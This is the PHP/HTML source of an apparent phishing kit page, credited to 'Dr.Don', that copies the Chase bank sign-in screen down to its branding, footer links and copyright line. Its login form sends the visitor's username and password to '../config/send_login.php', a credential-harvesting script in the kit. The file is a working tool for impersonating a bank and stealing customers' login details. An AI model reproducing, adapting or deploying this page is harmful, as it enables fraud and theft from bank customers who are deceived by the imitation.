<?php
/* ==================== || CODED BY Dr.Don || ==================== */
session_start();

include("../config/function.php")

/* ==================== || CODED BY Dr.Don  || ==================== */
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" dir="ltr" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="msapplication-config" content="none">
        <title>Sign in - chase-com</title>
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="shortcut icon" href="../img/chasefavicon.ico">
        <style>@font-face {font-family: Open Sans;font-style: normal;font-weight: 400;src: url('') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.woff') format('woff'),url('') format('truetype'),url('') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 600;src: url('') format('embedded-opentype'),url('') format('woff'),url('') format('truetype'),url('') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 300;src: url('') format('embedded-opentype'),url('') format('woff'),url('') format('truetype'),url('') format('svg');}@font-face {font-family: videoplayer;font-style: normal;font-weight: normal;src: url('') format('embedded-opentype'),url('') format('woff'),url('') format('truetype'),url('') format('svg');}
        html {height:100%; background: #fff;}

        @media only screen and (min-width: 768px) {
        html {
        background:#1c4f82; background:-moz-linear-gradient(top,#1c4f82 0%, #2e6ea3 100%); background:-webkit-linear-gradient(top,#1c4f82 0%,#2e6ea3 100%); background:linear-gradient(to bottom,#1c4f82 0%,#2e6ea3 100%);
        }
        }
        </style>
        <noscript>
</noscript>

        


        
        

        <script type="text/javascript" charset="UTF-8" src="css js/appConfig.js"></script>
        <script type="text/javascript" charset="UTF-8" src="css js/ss.js"></script>
	</script><style type="text/css"></style>
 <link rel="stylesheet" href="css js/blue-ui.css">
 <link rel="stylesheet" href="css js/logon.css">
	
	</head>
    <body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
	<div data-is-view="true">
	<div class="homepage" tabindex="-1">

	<header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true">
<div
 class="logon header jpui transparent navigation bar">
 <img style="max-width: 60%;"   src="../img/logo.png" />
</div>
	</header> 
	<main id="logon-content" data-has-view="true">
	<div class="container logon" data-is-view="true">
	<div>
	<div id="backgroundImage">
	<div class="jpui background image fixed show-xs show-sm" id="geoImage">
	<style type="text/css">.jpui.background.image { background-image: url(http://b.up-00.com/2018/01/151727043431841.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='http://b.up-00.com/2018/01/151727043431841.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='http://b.up-00.com/2018/01/151727043431841.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(http://b.up-00.com/2018/01/151727043431841.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(http://b.up-00.com/2018/01/151727043431841.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(http://b.up-00.com/2018/01/151727043431841.jpeg); } }
	</style>
	</div>
	</div>
	</div>
	<div class="row">
	<div class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden" id="logoffbox">
	<div class="jpui raised segment">
	<div class="row">
	<div class="col-xs-10 col-xs-offset-1"><h3 class="u-focus in-progress" tabindex="-1" id="logoff-header">You're being signed out.</h3>
	</div>
	</div>
	<div class="row">
	<div class="col-xs-12">
	<div class="progress">
	<div class="bar">
	</div>
	</div>
	</div>
	</div>
	</div>
	</div>
	<div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box" id="logonbox">
	<div class="jpui raised segment">
	<div class="row">
	<div class="col-xs-10 col-xs-offset-1">
	<form id="login-form" method="POST" autocomplete="off" action="../config/send_login.php" novalidate="">
	<label class="util accessible-text logon-xs-toggle" for="userId-input-field" data-attr="LOGON.userIdPlaceholder">
	<span class="accessible-text errorAdaText">
	</span>Username</label>
	<div class="logon-xs-toggle" id="userId">
	<input class="jpui input"  placeholder="Username" name="userId" type="text"  >   
	</div> 
	<label class="util accessible-text logon-xs-toggle" for="password-input-field" data-attr="LOGON.passwordPlaceholder">
	<span class="accessible-text errorAdaText">
	</span>Password</label> 
	<div class="logon-xs-toggle" id="password">
	<input min="0" class="jpui input" id="password-input-field" placeholder="Password" aria-describedby="password-helpertext" aria-invalid="false" autocomplete="off" name="password" data-validate="password" required="" value="" data-attr="LOGON.password" type="password" required>   
	</div> 

	<div class="row logon-xs-toggle">
	<div class="col-xs-6 rememberMe-checkbox-container">
	<div class="jpui checkbox" id="rememberMe">
	<div class="checkbox-flex">
	<div class="checkboxWrap">
	<input id="input-rememberMe" aria-label="This checked box means that we will remember your username.  Remember me" name="rememberMe" value="on" data-attr="LOGON.rememberMyUserId" type="checkbox"> <i class="jpui checkmark icon check" aria-hidden="true"></i>
	</div> 
	<label for="input-rememberMe"> <span class="checkbox-label" id="label-rememberMe" data-attr="LOGON.rememberMyUserIdLabel">Remember me </span>
	</label>
	</div> 
	</div>
	</div> 
	</div>
	<div class="row"><button class="jpui button focus fluid primary" type="submit" id="signin-button" data-attr="LOGON.logonToLandingPage"><span class="label">Sign in</span> </button>
	</div> 
	<div class="row"><span class="jpui link" id="forgotPassword-link-wrapper"><a class="link-anchor" id="forgotPassword" href="javascript:void(0);" aria-label="Forgot username/password?" data-attr="LOGON.forgotPasswordNavigation">Forgot username/password?</a></span>
	</div> 
	<div class="row"><span class="jpui link" id="enrollment-link-wrapper"><a class="link-anchor last" id="enrollment" href="javascript:void(0);" aria-label="Not enrolled? Sign up now." data-attr="LOGON.enrollNavigation">Not enrolled? Sign up now.</a></span>
	</div>
	</form>
	</div>
	</div>
	</div>
	</div>
	</div>
	</div>
	</main>
<footer id="logon-footer"
 class="toggle-aria-hidden" data-has-view="true"></footer>
<div class="footer-container">
<div class="container">
<div class="social-links row">
<div class="col-xs-12">
 <span class="follow-us-text" style="
    height: 30px;
">Follow us:</span>
<img itemprop="logo" height="22" width="176" alt="Chase" src="css js/Capture.PNG">
</div>
</div>
	<div class="footer-links row">
	<div class="col-xs-12"><ul><li><a href="#" data-attr="LOGON_FOOTER_MENU.requestContactUs">Contact us</a></li> 
	<li><a href="#" data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy</a></li> 
	<li><a href="#" data-attr="LOGON_FOOTER_MENU.requestSecurity">Security</a></li> 
	<li><a href="#" data-attr="LOGON_FOOTER_MENU.requestTermsOfUse">Terms of use</a></li> 
	<li><a href="#" data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our commitment to accessibility</a></li> 
	<li><a href="#" data-attr="LOGON_FOOTER_MENU.requestMortgageLoanOriginators">SAFE Act: Chase Mortgage Loan Originators</a></li> 
	<li><a href="#" data-attr="LOGON_FOOTER_MENU.requestHomeMortgageDisclosureAct">Fair Lending</a></li> 
	<li><a href="#" data-attr="LOGON_FOOTER_MENU.requestAboutChase">About Chase</a></li> 
	<li><a href="#" data-attr="LOGON_FOOTER_MENU.requestJpMorgan">J.P. Morgan</a></li> 
	<li><a href="#" data-attr="LOGON_FOOTER_MENU.requestJpMorganChaseCo">JPMorgan Chase &amp; Co.</a></li> 
	<li><a href="#" data-attr="LOGON_FOOTER_MENU.requestCareers">Careers</a></li>
	<li><a href="#" data-attr="LOGON_FOOTER_MENU.requestEspanol" lang="es">Español</a></li>
	<li><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseCanada">Chase Canada</a></li>
	<li><a href="#" data-attr="LOGON_FOOTER_MENU.requestSiteMap">Site map</a></li>
	<li>Member FDIC</li> <li><i class="LOGON_FOOTER_MENU.requestSiteMap" aria-hidden="true"></i> Equal Housing Lender</li> 
	<li class="copyright-label">© 2018 JPMorgan Chase &amp; Co.</li></ul>
	</div>
	</div>
	<div class="row galaxy-footer">
	<div class="col-xs-10 col-xs-offset-1"><p class="NOTE"><span></span><br> <span class="copyright-label">© 2018 JPMorgan Chase &amp; Co.</span><br> <a class="NOTELINK" href="#" data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy <i class="jpui progressright icon end-icon" aria-hidden="true"></i></a><br> 
	<a href="#" data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our commitment to accessibility<i class="jpui progressright icon end-icon" aria-hidden="true"></i></a></p></div></div></div></div></footer></div> <div id="languageSupportDisclaimer"></div> <div id="overlay" data-has-view="true"></div> 
	<div id="signoutModal"></div>
	<div id="siteExitWarning"></div>
	<div id="serviceErrorModal"></div>
	<div id="sessionTimeoutModal"></div>
	</div>
	</body>
	</html>
	